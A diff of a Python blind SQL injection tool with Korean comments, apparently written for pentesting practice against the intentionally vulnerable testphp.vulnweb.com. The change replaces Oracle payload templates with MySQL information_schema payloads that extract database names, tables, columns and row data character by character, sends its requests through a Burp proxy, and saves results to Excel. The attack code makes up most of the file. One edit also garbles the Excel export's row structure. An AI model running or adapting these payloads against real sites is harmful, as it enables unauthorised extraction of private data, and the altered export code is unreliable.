@@ -7,61 +7,85 @@ from openpyxl import Workbook
 from openpyxl.styles import Font, PatternFill
 from datetime import datetime
 import urllib3
+import threading
+from queue import Queue
 
 # InsecureRequestWarning 무시 설정
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # 설정 정보
 url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
-param_name = "artist"  # 공격할 파라미터 이름
+param_name = "artist"  # 공격할 파라메터 이름
 true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
 sleep_time = 0  # 요청 간 지연 시간 (초)
 
+# Burp Suite 프록시 설정
+proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "http://127.0.0.1:8080",
+}
+
 # SQL Injection 페이로드 템플릿 설정 (오라클 DB용)
 payload_templates = {
-    "database_name": "1' AND SUBSTR((SELECT sys_context('userenv','instance_name') FROM dual), {i}, 1) = '{char}' -- ",
-    "table_name": "1' AND SUBSTR((SELECT table_name FROM (SELECT table_name FROM all_tables WHERE owner = (SELECT sys_context('userenv','current_schema') FROM dual) AND ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' -- ",
-    "column_name": "1' AND SUBSTR((SELECT column_name FROM (SELECT column_name FROM all_tab_columns WHERE table_name = '{table_name}' AND ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' -- ",
-    "column_data": "1' AND SUBSTR((SELECT {column_name} FROM (SELECT {column_name} FROM {table_name} WHERE ROWNUM <= {index}) WHERE ROWNUM = {index}), {i}, 1) = '{char}' -- "
+    "database_name": "1 AND SUBSTRING((SELECT schema_name FROM information_schema.schemata LIMIT {index},1), {i}, 1) = '{char}' --",
+    "table_name": "1 AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='{db_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
+    "column_name": "1 AND SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT {index},1), {i}, 1) = '{char}' --",
+    "column_data": "1 AND SUBSTRING((SELECT {column_name} FROM {table_name} LIMIT {index},1), {i}, 1) = '{char}' --"
 }
 
 # 참/거짓 판별 함수
 def is_true_response(response):
     return true_response_indicator in response.text
 
-# 데이터베이스 이름 추출 함수
-def get_database_name():
-    db_name = ""
-    print("[정보] 데이터베이스 이름을 찾고 있습니다...")
-    for i in range(1, 50):  # 최대 길이 50자 가정
-        found_char = False
-        for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-            payload = payload_templates["database_name"].format(i=i, char=char)
-            params = {param_name: payload}
-            response = send_request(params)
-            time.sleep(sleep_time)  # 요청 후 지연
+# 요청 전송 함수
+def send_request(params):
+    if request_method == "POST":
+        return requests.post(url, data=params, timeout=90, verify=False, proxies=proxies)
+    elif request_method == "GET":
+        return requests.get(url, params=params, timeout=90, verify=False, proxies=proxies)
+    else:
+        raise ValueError("잘못된 요청 방식입니다. GET 또는 POST만 가능합니다.")
 
-            if is_true_response(response):
-                db_name += char
-                print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
-                found_char = True
+# 데이터베이스 이름 추출 함수
+def get_database_names():
+    db_names = []
+    print("[정보] 데이터베이스 이름을 찾고 있습니다...")
+    for index in range(1, 101):  # 최대 100개 데이터베이스 가정
+        db_name = ""
+        for i in range(1, 50):  # 최대 길이 50자 가정
+            found_char = False
+            for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
+                payload = payload_templates["database_name"].format(index=index, i=i, char=char)
+                params = {param_name: payload}
+                response = send_request(params)
+                time.sleep(sleep_time)
+
+                if is_true_response(response):
+                    db_name += char
+                    found_char = True
+                    print(f"[+] 위치 {i}에서 '{char}' 문자 발견!")
+                    break
+            if not found_char:
                 break
-        if not found_char:
+        if db_name:
+            db_names.append(db_name)
+            print(f"[데이터베이스 발견] {index}번째 데이터베이스 이름: {db_name}")
+        else:
             break
-    print(tabulate([[db_name]] if db_name else [], headers=["Database Name"], tablefmt="grid"))
-    print(f"총 1건" if db_name else "총 0건")
-    return db_name
+    print(tabulate([[db] for db in db_names] if db_names else [], headers=["Database Names"], tablefmt="grid"))
+    print(f"총 {len(db_names)}건")
+    return db_names
 
 # 테이블 이름 추출 함수
-def get_table_names(limit="ALL"):
+def get_table_names(db_name, limit="ALL"):
     tables = []
-    print("[정보] 데이터베이스의 테이블 이름을 찾고 있습니다...")
+    print(f"[정보] 데이터베이스 '{db_name}'의 테이블 이름을 찾고 있습니다...")
     for index in range(1, 101 if limit == "ALL" else int(limit) + 1):  # 최대 100개 테이블 또는 사용자 지정 개수
         table_name = ""
         for i in range(1, 50):  # 최대 테이블 이름 길이 50자 가정
             found_char = False
             for char in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_":
-                payload = payload_templates["table_name"].format(index=index, i=i, char=char)
+                payload = payload_templates["table_name"].format(db_name=db_name, index=index, i=i, char=char)
                 params = {param_name: payload}
                 response = send_request(params)
                 time.sleep(sleep_time)  # 요청 후 지연
@@ -143,15 +167,6 @@ def get_column_data(table_name, column_name, limit="ALL"):
     print(f"총 {len(data)}건")
     return data
 
-# 요청 전송 함수
-def send_request(params):
-    if request_method == "POST":
-        return requests.post(url, data=params, timeout=90, verify=False)
-    elif request_method == "GET":
-        return requests.get(url, params=params, timeout=90, verify=False)
-    else:
-        raise ValueError("잘못된 요청 방식입니다. GET 또는 POST만 가능합니다.")
-
 # 엑셀 저장 함수
 def save_to_excel(data, headers, base_filename):
     # 파일명 생성 (오늘의 날짜 사용)
@@ -199,10 +214,10 @@ def main():
     global request_method
     while True:
         print("\n[옵션 선택]")
-        print("1. 데이터베이스 추출")
-        print("2. 테이블 추출")
-        print("3. 컬럼 추출")
-        print("4. 데이터 추출")
+        print("1. 모든 데이터베이스 추출")
+        print("2. 특정 데이터베이스의 테이블 추출")
+        print("3. 특정 테이블의 컬럼 추출")
+        print("4. 특정 테이블의 컬럼 데이터 추출")
         print("5. 종료")
         choice = input("작업을 선택하세요: ")
 
@@ -213,20 +228,15 @@ def main():
                 continue
 
         if choice == "1":
-            db_name = get_database_name()
+            db_names = get_database_names()
         elif choice == "2":
+            db_name = input("테이블을 가져올 데이터베이스 이름을 입력하세요: ")
             limit = input("추출할 테이블 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
-            tables = get_table_names(limit)
+            tables = get_table_names(db_name, limit)
         elif choice == "3":
-            table_choice = input("1. 특정 테이블의 컬럼 추출\n2. 전체 테이블의 컬럼 추출\n선택하세요: ").strip()
-            if table_choice == "1":
-                table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
-                limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
-                columns = get_column_names(table_name, limit)
-            elif table_choice == "2":
-                all_columns = get_all_columns()
-            else:
-                print("잘못된 선택입니다. 다시 입력하세요.")
+            table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
+            limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
+            columns = get_column_names(table_name, limit)
         elif choice == "4":
             table_name = input("데이터를 가져올 테이블 이름을 입력하세요: ")
             column_name = input("데이터를 가져올 컬럼 이름을 입력하세요 (ALL 입력 시 모든 컬럼의 데이터 추출): ").strip().upper()
@@ -248,7 +258,7 @@ def main():
                 print(tabulate([[d] for d in data] if data else [], headers=[column_name], tablefmt="grid"))
                 save_choice = input("데이터를 엑셀로 저장하시겠습니까? (Y/N): ").strip().upper()
                 if save_choice == "Y":
-                    save_to_excel([[d] for d in data], [column_name], "extracted_data")
+                    save_to_excel([[d for d in data]], [column_name], "extracted_data")
         elif choice == "5":
             print("프로그램을 종료합니다.")
             break
